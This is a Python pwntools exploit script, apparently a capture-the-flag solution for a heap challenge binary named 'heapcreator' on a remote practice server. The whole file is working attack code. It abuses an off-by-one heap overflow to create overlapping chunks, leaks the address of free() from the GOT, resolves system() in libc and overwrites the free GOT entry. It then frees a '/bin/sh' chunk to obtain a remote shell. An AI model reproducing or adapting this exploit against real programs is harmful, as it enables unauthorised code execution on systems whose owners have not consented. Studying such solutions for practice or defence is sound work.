##################heapcreator.py###################
# -*- coding:utf-8 -*-
#Author: Squarer
#Time: Fri Oct 16 09:11:25 CST 2020
##################heapcreator.py###################
from pwn import*
from LibcSearcher import*

#context.log_level = 'debug'
context.arch = 'amd64'

elf = ELF('./heapcreator')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc=ELF('/lib/x86_64-linux-gnu/libc.so.')
# libc=ELF('/lib/i386-linux-gnu/libc.so.6')

def create(size,cont):
	sh.sendlineafter('Your choice :','1')
	sh.sendlineafter('Size of Heap : ',str(size))
	sh.sendlineafter('Content of heap:',str(cont))

def edit(index,cont):
	sh.sendlineafter('Your choice :','2')
	sh.sendlineafter('Index :',str(index))
	sh.sendafter('Content of heap : ',str(cont))

def show(index):
	sh.sendlineafter('Your choice :','3')
	sh.sendlineafter('Index :',str(index))
	sh.recvuntil('Content : ')
	show_cont = sh.recvuntil('\n',drop=1)
	return show_cont[-6:].ljust(8,'\x00')

def delete(index):
	sh.sendlineafter('Your choice :','4')
	sh.sendlineafter('Index :',str(index))

def exit():
	sh.sendlineafter('Your choice :','5')

#sh = process('./heapcreator')
sh = remote('node3.buuoj.cn',28167)

create(0x18,'AAAAAAAA') #0
create(0x10,'BBBBBBBB') #1
create(0x10,'AAAAAAAA') #2

payload0 = '/bin/sh\x00'.ljust(0x18,'A') + '\x81'
edit(0,payload0)
delete(1)

payload1 = 'A'*0x40 + p64(0x100) + p64(elf.got['free'])
create(0x70,payload1) #3
free_addr = u64(show(2))
print hex(free_addr)

lib = LibcSearcher('free',free_addr)
lib_addr = free_addr - lib.dump('free')
system_addr = lib_addr + lib.dump('system')
log.success('system_addr:' + hex(system_addr))
'''
libc_addr = free_addr - libc.symbols['free']
system = libc_addr + libc.symbols['system']
print hex(system_addr)
'''
edit(2,p64(system_addr))
delete(0)

sh.interactive()
